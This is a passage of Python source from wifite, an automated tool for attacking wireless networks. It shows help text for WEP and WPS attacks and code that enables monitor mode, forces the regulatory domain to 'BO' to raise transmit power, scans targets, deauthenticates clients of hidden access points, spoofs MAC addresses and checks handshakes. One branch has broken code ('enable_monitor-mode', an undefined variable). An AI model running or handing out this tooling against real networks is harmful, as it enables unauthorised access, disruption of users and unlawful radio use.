	print sw+'\t-cowpatty   \t'+des+'verify handshake using cowpatty '+de+'[off]'+W
	
	print head+'\n   WEP'+W
	print sw+'\t-wep        \t'+des+'only target WEP networks '+de+'[off]'+W
	print sw+'\t-pps '+var+'<num>  \t'+des+'set the number of packets per second to inject '+de+'[600]'+W
	print sw+'\t-wept '+var+'<sec> \t'+des+'sec to wait for each attack, 0 implies endless '+de+'[600]'+W
	print sw+'\t-chopchop   \t'+des+'use chopchop attack      '+de+'[on]'+W
	print sw+'\t-arpreplay  \t'+des+'use arpreplay attack     '+de+'[on]'+W
	print sw+'\t-fragment   \t'+des+'use fragmentation attack '+de+'[on]'+W
	print sw+'\t-caffelatte \t'+des+'use caffe-latte attack   '+de+'[on]'+W
	print sw+'\t-p0841      \t'+des+'use -p0841 attack        '+de+'[on]'+W
	print sw+'\t-hirte      \t'+des+'use hirte (cfrag) attack '+de+'[on]'+W
	print sw+'\t-nofakeauth \t'+des+'stop attack if fake authentication fails    '+de+'[off]'+W
	print sw+'\t-wepca '+GR+'<n>  \t'+des+'start cracking when number of ivs surpass n '+de+'[10000]'+W
	print sw+'\t-wepsave    \t'+des+'save a copy of .cap files to this directory '+de+'[off]'+W
	
	print head+'\n   WPS'+W
	print sw+'\t-wps       \t'+des+'only target WPS networks         '+de+'[off]'+W
	print sw+'\t-wpst '+var+'<sec>  \t'+des+'max wait for new retry before giving up (0: never)  '+de+'[660]'+W
	print sw+'\t-wpsratio '+var+'<per>\t'+des+'min ratio of successful PIN attempts/total tries    '+de+'[0]'+W
	print sw+'\t-wpsretry '+var+'<num>\t'+des+'max number of retries for same PIN before giving up '+de+'[0]'+W

	print head+'\n   EXAMPLE'+W
	print sw+'\t./wifite.py '+W+'-wps -wep -c 6 -pps 600'+W
	print ''











###########################
# WIRELESS CARD FUNCTIONS #
###########################


def enable_monitor_mode(iface):
	"""
		Uses airmon-ng to put a device into Monitor Mode.
		Then uses the get_iface() method to retrieve the new interface's name.
		Sets global variable IFACE_TO_TAKE_DOWN as well.
		Returns the name of the interface in monitor mode.
	"""
	global IFACE_TO_TAKE_DOWN
	print GR+' [+]'+W+' enabling monitor mode on %s...' % (G+iface+W),
	stdout.flush()
	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
	print 'done'
	IFACE_TO_TAKE_DOWN = get_iface()
	print GR+' [+]'+W+' txpower set %s...' % (G+'27'+W),
	call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
	call(['iwconfig', iface, 'txpower', '27'], stdout=OUTLOG, stderr=ERRLOG)
	print 'done'
	return IFACE_TO_TAKE_DOWN


def disable_monitor_mode():
	"""
		The program may have enabled monitor mode on a wireless interface.
		We want to disable this before we exit, so we will do that.
	"""
	if IFACE_TO_TAKE_DOWN == '': return
	print GR+' [+]'+W+' disabling monitor mode on %s...' % (G+IFACE_TO_TAKE_DOWN+W),
	stdout.flush()
	call(['airmon-ng', 'stop', IFACE_TO_TAKE_DOWN], stdout=OUTLOG, stderr=ERRLOG)
	print 'done'

PRINTED_SCANNING = False
def get_iface():
	"""
		Get the wireless interface in monitor mode. 
		Defaults to only device in monitor mode if found.
		Otherwise, enumerates list of possible wifi devices
		and asks user to select one to put into monitor mode (if multiple).
		Uses airmon-ng to put device in monitor mode if needed.
		Returns the name (string) of the interface chosen in monitor mode.
	"""
	global PRINTED_SCANNING
	if not PRINTED_SCANNING:
		print GR+' [+]'+W+' scanning for wireless devices...'
		PRINTED_SCANNING = True
	
	proc  = Popen(['iwconfig'], stdout=PIPE, stderr=ERRLOG)
	iface = ''
	monitors = []
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0: continue
		if ord(line[0]) != 32: # Doesn't start with space
			iface = line[:line.find(' ')] # is the interface
		if line.find('Mode:Monitor') != -1:
			monitors.append(iface)
	
	if WIRELESS_IFACE != '':
		if monitors.count(WIRELESS_IFACE): return WIRELESS_IFACE
		print R+' [!]'+O+' could not find wireless interface %s' % ('"'+R+WIRELESS_IFACE+O+'"'+W)

	if len(monitors) == 1:
		return monitors[0] # Default to only device in monitor mode
	elif len(monitors) > 1:
		print GR+" [+]"+W+" interfaces in "+G+"monitor mode:"+W
		for i, monitor in enumerate(monitors):
			print "  %s. %s" % (G+str(i+1)+W, G+monitor+W)
		ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
                  (GR,     W,       G,       W,                              G, len(monitors), W, G))
		while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
			ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
                     (GR,   W,                                              G, len(monitors), W, G))
		i = int(ri)
		return monitors[i - 1]
	
	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=ERRLOG)
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0 or line.startswith('Interface'): continue
		#monitors.append(line[:line.find('\t')])
		monitors.append(line)
	
	if len(monitors) == 0:
		print R+' [!]'+O+" no wireless interfaces were found."+W
		print R+' [!]'+O+" you need to plug in a wifi device or install drivers.\n"+W
		exit_gracefully(0)
	elif WIRELESS_IFACE != '' and monitors.count(WIRELESS_IFACE) > 0:
		mac_anonymize(monitor)
		return enable_monitor-mode

	elif len(monitors) == 1:
		monitor = monitors[0][:monitors[0].find('\t')]
		mac_anonymize(monitor)
		
		return enable_monitor_mode(monitor)
	
	print GR+" [+]"+W+" available wireless devices:"
	for i, monitor in enumerate(monitors):
		print "  %s%d%s. %s" % (G, i + 1, W, monitor)
	
	ri = raw_input(GR+" [+]"+W+" select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
	while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
		ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
	i = int(ri)
	monitor = monitors[i-1][:monitors[i-1].find('\t')]
	mac_anonymize(monitor)
	
	return enable_monitor_mode(monitor)








######################
# SCANNING FUNCTIONS #
######################


def scan(channel=0, iface='', tried_rtl8187_fix=False):
	"""
		Scans for access points. Asks user to select target(s).
			"channel" - the channel to scan on, 0 scans all channels.
			"iface"   - the interface to scan on. must be a real interface.
			"tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
		Returns list of selected targets and list of clients.
	"""
	remove_airodump_files(temp + 'wifite')
	
	command = ['airodump-ng', 
	           '-a', # only show associated clients
	           '-w', temp + 'wifite'] # output file
	if channel != 0:
		command.append('-c')
		command.append(str(channel))
	command.append(iface)
	
	proc = Popen(command, stdout=OUTLOG, stderr=ERRLOG)
	
	time_started = time.time()
	print GR+' [+] '+G+'initializing scan'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.'
	(targets, clients) = ([], [])
	try:
		deauth_sent = 0.0
		old_targets = []
		stop_scanning = False
		while True:
			time.sleep(0.3)
			if not os.path.exists(temp + 'wifite-01.csv') and time.time() - time_started > 1.0:
				print R+'\n [!] ERROR!'+W
				# RTL8187 Unknown Error 132 FIX
				if proc.poll() != None: # Check if process has finished
					proc = Popen(['airodump-ng', iface], stdout=OUTLOG, stderr=PIPE)
					if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
						if rtl8187_fix(iface):
							return scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
				print R+' [!]'+O+' wifite is unable to generate airodump-ng output files'+W
				print R+' [!]'+O+' you may want to disconnect/reconnect your wifi device'+W
				exit_gracefully(1)
				
			(targets, clients) = ([], [])
			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
			
			# If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
			if TARGET_ESSID != '':
				for t in targets:
					if t.ssid.lower() == TARGET_ESSID.lower():
						send_interrupt(proc)
						try: os.kill(proc.pid, SIGTERM)
						except OSError: pass
						except UnboundLocalError: pass
						targets = [t]
						stop_scanning = True
						break
			if TARGET_BSSID != '':
				for t in targets:
					if t.bssid.lower() == TARGET_BSSID.lower():
						send_interrupt(proc)
						try: os.kill(proc.pid, SIGTERM)
						except OSError: pass
						except UnboundLocalError: pass
						targets = [t]
						stop_scanning = True
						break
			
			# If user has chosen to target all access points, wait 60 seconds, then return all
			if ATTACK_ALL_TARGETS and time.time() - time_started > 60:
				print GR+'\n [+]'+W+' auto-targeted %s%d%s access point%s' % (G, len(targets), W, '' if len(targets) == 1 else 's')
				stop_scanning = True
				
			if ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
				# Remove targets with power < threshold
				i = 0
				before_count = len(targets)
				while i < len(targets):
					if targets[i].power < ATTACK_MIN_POWER:
						targets.pop(i)
					else: i += 1
				print GR+'\n [+]'+W+' removed %s targets with power < %ddB, %s remain' % \
				                (G+str(before_count - len(targets))+W, ATTACK_MIN_POWER, G+str(len(targets))+W)
				stop_scanning = True
			
			if stop_scanning: break
			
			# If there are unknown SSIDs, send deauths to them.
			if channel != 0 and time.time() - deauth_sent > 5:
				deauth_sent = time.time()
				for t in targets:
					if t.ssid == '':
						print "\r %s deauthing hidden access point (%s)               \r" % \
						      (GR+sec_to_hms(time.time() - time_started)+W, G+t.bssid+W),
						stdout.flush()
						# Time to deauth
						cmd = ['aireplay-ng',
						       '--ignore-negative-one',
						       '--deauth', str(WPA_DEAUTH_COUNT),
						       '-a', t.bssid]
						for c in clients:
							if c.station == t.bssid:
								cmd.append('-c')
								cmd.append(c.bssid)
								break
						cmd.append(iface)
						proc_aireplay = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
						proc_aireplay.wait()
						time.sleep(0.5)
					else:
						for ot in old_targets:
							if ot.ssid == '' and ot.bssid == t.bssid:
								print '\r %s successfully decloaked "%s"                     ' % \
								        (GR+sec_to_hms(time.time() - time_started)+W, G+t.ssid+W)
				
				old_targets = targets[:]
			if VERBOSE_APS and len(targets) > 0:
				targets = sorted(targets, key=lambda t: t.power, reverse=True)
				if not WPS_DISABLE:
					wps_check_targets(targets, temp + 'wifite-01.cap', verbose=False)
				
				os.system('clear')
				print GR+'\n [+] '+G+'scanning'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.\n'
				print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if SHOW_MAC_IN_SCAN else '')
				print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if SHOW_MAC_IN_SCAN else '')
				for i, target in enumerate(targets):
					print "   %s%2d%s " % (G, i + 1, W),
					# SSID
					if target.ssid == '':
						p = O+'('+target.bssid+')'+GR+' '+W
						print '%s' % p.ljust(20),
					elif ( target.ssid.count('\x00') == len(target.ssid) ):
						p = '<Length '+str(len(target.ssid))+'>'
						print '%s' % C+p.ljust(20)+W,
					elif len(target.ssid) <= 20:
						print "%s" % C+target.ssid.ljust(20)+W,
					else:
						print "%s" % C+target.ssid[0:17] + '...'+W,
					# BSSID
					if SHOW_MAC_IN_SCAN:
						print O,target.bssid+W,
					# Channel
					print G+target.channel.rjust(3),W,
					# Encryption
					if target.encryption.find("WEP") != -1: print G,
					else:                                   print O,
					print "\b%3s" % target.encryption.strip().ljust(4) + W,
					# Power
					if target.power >= 55:   col = G
					elif target.power >= 40: col = O
					else:                    col = R
					print "%s%3ddb%s" % (col,target.power, W),
					# WPS
					if WPS_DISABLE:
						print "  %3s" % (O+'n/a'+W),
					else:
						print "  %3s" % (G+'wps'+W if target.wps else R+' no'+W),
					# Clients
					client_text = ''
					for c in clients:
						if c.station == target.bssid: 
							#if client_text == '': client_text = 'client'
							#elif client_text[-1] != "s": client_text += "s"
							client_text += "[" + str(c.bssid) + "] "
					if client_text != '': print '  %s' % (G+client_text+W)
					else: print ''
				print ''
			print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
			      GR+sec_to_hms(time.time() - time_started)+W, G+'scanning'+W, 
			      G+str(len(targets))+W, '' if len(targets) == 1 else 's', 
			      G+str(len(clients))+W, '' if len(clients) == 1 else 's'),
			
			stdout.flush()
	except KeyboardInterrupt:
		pass
	print ''
	
	send_interrupt(proc)
	try: os.kill(proc.pid, SIGTERM)
	except OSError: pass
	except UnboundLocalError: pass
	
	# Use "wash" program to check for WPS compatibility
	if not WPS_DISABLE:
		wps_check_targets(targets, temp + 'wifite-01.cap')
	
	remove_airodump_files(temp + 'wifite')

	if stop_scanning: return (targets, clients)
	print ''
	
	if len(targets) == 0:
		print R+' [!]'+O+' no targets found!'+W
		print R+' [!]'+O+' you may need to wait for targets to show up.'+W
		print ''
		exit_gracefully(1)

	if VERBOSE_APS: os.system('clear')

	# Sort by Power
	targets = sorted(targets, key=lambda t: t.power, reverse=True)
	
	victims = []
	print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if SHOW_MAC_IN_SCAN else '')
	print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if SHOW_MAC_IN_SCAN else '')
	for i, target in enumerate(targets):
		print "   %s%2d%s " % (G, i + 1, W),
		# SSID
		if target.ssid == '':
			p = O+'('+target.bssid+')'+GR+' '+W
			print '%s' % p.ljust(20),
		elif ( target.ssid.count('\x00') == len(target.ssid) ):
			p = '<Length '+str(len(target.ssid))+'>'
			print '%s' % C+p.ljust(20)+W,
		elif len(target.ssid) <= 20:
			print "%s" % C+target.ssid.ljust(20)+W,
		else:
			print "%s" % C+target.ssid[0:17] + '...'+W,
		# BSSID
		if SHOW_MAC_IN_SCAN:
			print O,target.bssid+W,
		# Channel
		print G+target.channel.rjust(3),W,
		# Encryption
		if target.encryption.find("WEP") != -1: print G,
		else:                                   print O,
		print "\b%3s" % target.encryption.strip().ljust(4) + W,
		# Power
		if target.power >= 55:   col = G
		elif target.power >= 40: col = O
		else:                    col = R
		print "%s%3ddb%s" % (col,target.power, W),
		# WPS
		if WPS_DISABLE:
			print "  %3s" % (O+'n/a'+W),
		else:
			print "  %3s" % (G+'wps'+W if target.wps else R+' no'+W),
		# Clients
		client_text = ''
		for c in clients:
			if c.station == target.bssid: 
				#if client_text == '': client_text = 'client'
				#elif client_text[-1] != "s": client_text += "s"
				client_text = "[" + str(c.bssid) + "] "
		if client_text != '': print '  %s' % (G+client_text+W)
		else: print ''
	
	ri = raw_input(GR+"\n [+]"+W+" select "+G+"target numbers"+W+" ("+G+"1-%s)" % (str(len(targets))+W) + \
	                     " separated by commas, or '%s': " % (G+'all'+W))
	if ri.strip().lower() == 'all':
		victims = targets[:]
	else:
		for r in ri.split(','):
			r = r.strip()
			if r.find('-') != -1:
				(sx, sy) = r.split('-')
				if sx.isdigit() and sy.isdigit():
					x = int(sx)
					y = int(sy) + 1
					for v in xrange(x, y):
						victims.append(targets[v - 1])
			elif not r.isdigit() and r.strip() != '':
				print O+" [!]"+R+" not a number: %s " % (O+r+W)
			elif r != '':
				victims.append(targets[int(r) - 1])
		
	if len(victims) == 0:
		print O+'\n [!] '+R+'no targets selected.\n'+W
		exit_gracefully(0)
	
	print ''
	print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')
	
	return (victims, clients)


def parse_csv(filename):
	"""
		Parses given lines from airodump-ng CSV file.
		Returns tuple: List of targets and list of clients.
	"""
	if not os.path.exists(filename): return ([], [])
	try:
		f = open(filename, 'r')
		lines = f.read().split('\n')
		f.close()
	except IOError: return ([], [])
	
	hit_clients = False
	targets = []
	clients = []
	for line in lines:
		if line.startswith('Station MAC,'): hit_clients = True
		if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
		if not hit_clients: # Access points
			c = line.split(', ', 13)
			if len(c) <= 11: continue
			cur = 11
			c[cur] = c[cur].strip()
			if not c[cur].isdigit(): cur += 1
			if cur > len(c) - 1: continue
			
			ssid = c[cur+1]
			ssidlen = int(c[cur])
			ssid = ssid[:ssidlen]
			
			power = int(c[cur-4])
			if power < 0: power += 100
			
			enc = c[5]
			# Ignore non-WPA/WEP networks.
			if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
			if WEP_DISABLE and enc.find('WEP') != -1: continue
			if WPA_DISABLE and WPS_DISABLE and enc.find('WPA') != -1: continue
			enc = enc.strip()[:4]
			
			t = Target(c[0], power, c[cur-2].strip(), c[3], enc, ssid)
			targets.append(t)
		else: # Connected clients
			c = line.split(', ')
			if len(c) < 6: continue
			bssid   = re.sub(r'[^a-zA-Z0-9:]', '', c[0])
			station = re.sub(r'[^a-zA-Z0-9:]', '', c[5])
			power   = c[3]
			if station != 'notassociated':
				c = Client(bssid, station, power)
				clients.append(c)
	return (targets, clients)


def wps_check_targets(targets, cap_file, verbose=True):
	"""
		Uses reaver's "walsh" (or wash) program to check access points in cap_file
		for WPS functionality. Sets "wps" field of targets that match to True.
	"""
	global WPS_DISABLE
	
	if not program_exists('walsh') and not program_exists('wash'):
		WPS_DISABLE = True # Tell 'scan' we were unable to execute walsh
		return
	program_name = 'walsh' if program_exists('walsh') else 'wash'
	
	if len(targets) == 0 or not os.path.exists(cap_file): return
	if verbose:
		print GR+' [+]'+W+' checking for '+G+'WPS compatibility'+W+'...',
		stdout.flush()
	
	cmd = [program_name,
	       '-f', cap_file,
	       '-C'] # ignore Frame Check Sum errors
	proc_walsh = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
	proc_walsh.wait()
	for line in proc_walsh.communicate()[0].split('\n'):
		if line.strip() == '' or line.startswith('Scanning for'): continue
		bssid = line.split(' ')[0]
		
		for t in targets:
			if t.bssid.lower() == bssid.lower():
				t.wps = True
	if verbose:
		print 'done'
	removed = 0
	if not WPS_DISABLE and WPA_DISABLE:
		i = 0
		while i < len(targets):
			if not targets[i].wps and targets[i].encryption.find('WPA') != -1:
				removed += 1
				targets.pop(i)
			else: i += 1
		if removed > 0 and verbose: print GR+' [+]'+O+' removed %d non-WPS-enabled targets%s' % (removed, W)


def rtl8187_fix(iface):
	"""
		Attempts to solve "Unknown error 132" common with RTL8187 devices.
		Puts down interface, unloads/reloads driver module, then puts iface back up.
		Returns True if fix was attempted, False otherwise.
	"""
	# Check if current interface is using the RTL8187 chipset
	proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=ERRLOG)
	proc_airmon.wait()
	using_rtl8187 = False
	for line in proc_airmon.communicate()[0].split():
		line = line.upper()
		if line.strip() == '' or line.startswith('INTERFACE'): continue
		if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True
	
	if not using_rtl8187: 
		# Display error message and exit
		print R+' [!]'+O+' unable to generate airodump-ng CSV file'+W
		print R+' [!]'+O+' you may want to disconnect/reconnect your wifi device'+W
		exit_gracefully(1)
	
	print O+" [!]"+W+" attempting "+O+"RTL8187 'Unknown Error 132'"+W+" fix..."
	
	original_iface = iface
	# Take device out of monitor mode
	airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=ERRLOG)
	airmon.wait()
	for line in airmon.communicate()[0].split('\n'):
		if line.strip() == '' or \
		   line.startswith("Interface") or \
		   line.find('(removed)') != -1:
			continue
		original_iface = line.split()[0] # line[:line.find('\t')]
	
	# Remove drive modules, block/unblock ifaces, probe new modules.
	print_and_exec(['ifconfig', original_iface, 'down'])
	print_and_exec(['rmmod', 'rtl8187'])
	print_and_exec(['rfkill', 'block', 'all'])
	print_and_exec(['rfkill', 'unblock', 'all'])
	print_and_exec(['modprobe', 'rtl8187'])
	print_and_exec(['ifconfig', original_iface, 'up'])
	print_and_exec(['airmon-ng', 'start', original_iface])
	
	print '\r                                                        \r',
	print O+' [!] '+W+'restarting scan...\n'
	
	return True


def print_and_exec(cmd):
	"""
		Prints and executes command "cmd". Also waits half a second
		Used by rtl8187_fix (for prettiness)
	"""
	print '\r                                                        \r',
	stdout.flush()
	print O+' [!] '+W+'executing: '+O+' '.join(cmd) + W,
	stdout.flush()
	call(cmd, stdout=OUTLOG, stderr=ERRLOG)
	time.sleep(0.1)



















####################
# HELPER FUNCTIONS #
####################

def remove_airodump_files(prefix):
	"""
		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
		Used by wpa_get_handshake() and attack_wep()
	"""
	remove_file(prefix + '-01.cap')
	remove_file(prefix + '-01.csv')
	remove_file(prefix + '-01.kismet.csv')
	remove_file(prefix + '-01.kismet.netxml')
	for filename in os.listdir(temp):
		if filename.lower().endswith('.xor'): remove_file(temp + filename)
	for filename in os.listdir('.'):
		if filename.startswith('replay_') and filename.endswith('.cap'):
			remove_file(filename)
		if filename.endswith('.xor'): remove_file(filename)
	# Remove .cap's from previous attack sessions
	"""i = 2
	while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
		os.remove(temp + 'wep-' + str(i) + '.cap')
		i += 1
	"""
	

def remove_file(filename):
	"""
		Attempts to remove a file. Does not throw error if file is not found.
	"""
	try: os.remove(filename)
	except OSError: pass


def program_exists(program):
	"""
		Uses 'which' (linux command) to check if a program is installed.
	"""
	
	proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
	txt = proc.communicate()
	if txt[0].strip() == '' and txt[1].strip() == '':
		return False
	if txt[0].strip() != '' and txt[1].strip() == '':
		return True
	
	return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)


def sec_to_hms(sec):
	"""
		Converts integer sec to h:mm:ss format
	"""
	if sec <= -1: return '[endless]'
	h = sec / 3600
	sec %= 3600
	m  = sec / 60
	sec %= 60
	return '[%d:%02d:%02d]' % (h, m, sec)


def send_interrupt(process): 
	"""
		Sends interrupt signal to process's PID. 
	""" 
	try:
		os.kill(process.pid, SIGINT) 
		# os.kill(process.pid, SIGTERM)
	except OSError: pass           # process cannot be killed
	except TypeError: pass         # pid is incorrect type
	except UnboundLocalError: pass # 'process' is not defined
	except AttributeError: pass    # Trying to kill "None"


def get_mac_address(iface):
	"""
		Returns MAC address of "iface".
	"""
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	mac = ''
	first_line = proc.communicate()[0].split('\n')[0]
	for word in first_line.split(' '):
		if word != '': mac = word
	if mac.find('-') != -1: mac = mac.replace('-', ':')
	if len(mac) > 17: mac = mac[0:17]
	return mac


def generate_random_mac(old_mac):
	"""
		Generates a random MAC address.
		Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
		Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
	"""
	random.seed()
	new_mac = old_mac[:8].lower().replace('-', ':')
	for i in xrange(0, 6):
		if i % 2 == 0: new_mac += ':'
		new_mac += '0123456789abcdef'[random.randint(0,15)]
	
	# Prevent generating the same MAC address via recursion.
	if new_mac == old_mac:
		new_mac = generate_random_mac(old_mac)
	return new_mac


def mac_anonymize(iface):
	"""
		Changes MAC address of 'iface' to a random MAC.
		Only randomizes the last 6 digits of the MAC, so the vender says the same.
		Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
	"""
	global ORIGINAL_IFACE_MAC
	if DO_NOT_CHANGE_MAC: return
	if not program_exists('ifconfig'): return
	
	# Store old (current) MAC address
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	for word in proc.communicate()[0].split('\n')[0].split(' '):
		if word != '': old_mac = word
	ORIGINAL_IFACE_MAC = (iface, old_mac)
	
	new_mac = generate_random_mac(old_mac)
	
	call(['ifconfig', iface, 'down'])
	
	print GR+" [+]"+W+" changing %s's MAC from %s to %s..." % (G+iface+W, G+old_mac+W, O+new_mac+W),
	stdout.flush()
	
	proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=OUTLOG, stderr=ERRLOG)
	print 'done'


def mac_change_back():
	"""
		Changes MAC address back to what it was before attacks began.
	"""
	iface = ORIGINAL_IFACE_MAC[0]
	old_mac = ORIGINAL_IFACE_MAC[1]
	if iface == '' or old_mac == '': return
	
	print GR+" [+]"+W+" changing %s's mac back to %s..." % (G+iface+W, G+old_mac+W),
	stdout.flush()
	
	call(['ifconfig', iface, 'down'], stdout=OUTLOG, stderr=ERRLOG)
	proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=OUTLOG, stderr=ERRLOG)
	print "done"


def analyze_capfile(capfile):
	"""
		Analyzes given capfile for handshakes using various programs.
		Prints results to console.
	"""
	global TARGET_BSSID, TARGET_ESSID
	
	if TARGET_ESSID == '' and TARGET_BSSID == '':
		print R+' [!]'+O+' target ssid and bssid are required to check for handshakes'
		print R+' [!]'+O+' please enter essid (access point name) using -e <name>'
		print R+' [!]'+O+' and/or target bssid (mac address) using -b <mac>\n'
		# exit_gracefully(1)
	
	if TARGET_BSSID == '':
		# Get the first BSSID found in tshark!
		TARGET_BSSID = get_bssid_from_cap(TARGET_ESSID, capfile)
		# if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
		if TARGET_BSSID == '':
			print R+' [!]'+O+' unable to guess BSSID from ESSID!'
		else:
			print GR+' [+]'+W+' guessed bssid: %s' % (G+TARGET_BSSID+W)
	
	if TARGET_BSSID != '' and TARGET_ESSID == '':
		TARGET_ESSID = get_essid_from_cap(TARGET_BSSID, capfile)
		
	print GR+'\n [+]'+W+' checking for handshakes in %s' % (G+capfile+W)
	
	t = Target(TARGET_BSSID, '', '', '', 'WPA', TARGET_ESSID)
	
	if program_exists('pyrit'):
		result = has_handshake_pyrit(t, capfile)
		print GR+' [+]'+W+'    '+G+'pyrit'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
	else: print R+' [!]'+O+' program not found: pyrit'
	if program_exists('cowpatty'):
		result = has_handshake_cowpatty(t, capfile, nonstrict=True)
		print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (nonstrict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
		result = has_handshake_cowpatty(t, capfile, nonstrict=False)
		print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (strict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
	else: print R+' [!]'+O+' program not found: cowpatty'
	if program_exists('tshark'):
		result = has_handshake_tshark(t, capfile)
		print GR+' [+]'+W+'    '+G+'tshark'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
	else: print R+' [!]'+O+' program not found: tshark'
	if program_exists('aircrack-ng'):
		result = has_handshake_aircrack(t, capfile)
		print GR+' [+]'+W+'    '+G+'aircrack-ng'+W+':\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
	else: print R+' [!]'+O+' program not found: aircrack-ng'

	print ''

	exit_gracefully(0)


def get_essid_from_cap(bssid, capfile):
	"""
		Attempts to get ESSID from cap file using BSSID as reference.
		Returns '' if not found.
	"""
	if not program_exists('tshark'): return ''

	cmd = ['tshark',
	       '-r', capfile,
	       '-R', '\'wlan.fc.type_subtype == 0x05 && wlan.sa == %s\'' % bssid,
	       '-n']
	proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	for line in proc.communicate()[0].split('\n'):
		if line.find('SSID=') != -1:
			essid = line[line.find('SSID=')+5:]
			print GR+' [+]'+W+' guessed essid: %s' % (G+essid+W)
			return essid
	print R+' [!]'+O+' unable to guess essid!'+W
	return ''


def get_bssid_from_cap(essid, capfile):
	"""
		Returns first BSSID of access point found in cap file.
		This is not accurate at all, but it's a good guess.
		Returns '' if not found.
	"""
	global TARGET_ESSID
	
	if not program_exists('tshark'): return ''

	 # Attempt to get BSSID based on ESSID
	if essid != '':
		cmd = ['tshark',
		       '-r', capfile,
		       '-R', '\'wlan_mgt.ssid == "%s" && wlan.fc.type_subtype == 0x05\'' % (essid),
		       '-n',            # Do not resolve MAC vendor names
		       '-T', 'fields',  # Only display certain fields
		       '-e', 'wlan.sa'] # souce MAC address
		proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
		proc.wait()
		bssid = proc.communicate()[0].split('\n')[0]
		if bssid != '': return bssid
	
	cmd = ['tshark',
	       '-r', capfile,
	       '-R', 'eapol',
	       '-n']
	proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	for line in proc.communicate()[0].split('\n'):
		if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):
			while line.startswith(' ') or line.startswith('\t'): line = line[1:]
			line = line.replace('\t', ' ')
			while line.find('  ') != -1: line = line.replace('  ', ' ')
			return line.split(' ')[2]
		elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):
			while line.startswith(' ') or line.startswith('\t'): line = line[1:]
			line = line.replace('\t', ' ')
			while line.find('  ') != -1: line = line.replace('  ', ' ')
			return line.split(' ')[4]
	return ''


def exit_gracefully(code=0):
	"""
		We may exit the program at any time.
		We want to remove the temp folder and any files contained within it.
		Removes the temp files/folder and exists with error code "code".
	"""
	# Remove temp files and folder
	if os.path.exists(temp):
		for file in os.listdir(temp):
			os.remove(temp + file)
		os.rmdir(temp)
	# Disable monitor mode if enabled by us
	disable_monitor_mode()
	# Change MAC address back if spoofed
	mac_change_back()
	print GR+" [+]"+W+" quitting" # wifite will now exit"
	print ''
	# GTFO
	exit(code)


def attack_interrupted_prompt():
	"""
		Promps user to decide if they want to exit, 
		skip to cracking WPA handshakes,
		or continue attacking the remaining targets (if applicable).
		returns True if user chose to exit complete, False otherwise
	"""
	global TARGETS_REMAINING
	should_we_exit = False
	# If there are more targets to attack, ask what to do next
	if TARGETS_REMAINING > 0:
		options = ''
		print GR+"\n [+] %s%d%s target%s remain%s" % (G, TARGETS_REMAINING, W,
								'' if TARGETS_REMAINING == 1 else 's', 
								's' if TARGETS_REMAINING == 1 else '')
		print GR+" [+]"+W+" what do you want to do?"
		options += G+'c'+W
		print G+"     [c]ontinue"+W+" attacking targets"
		
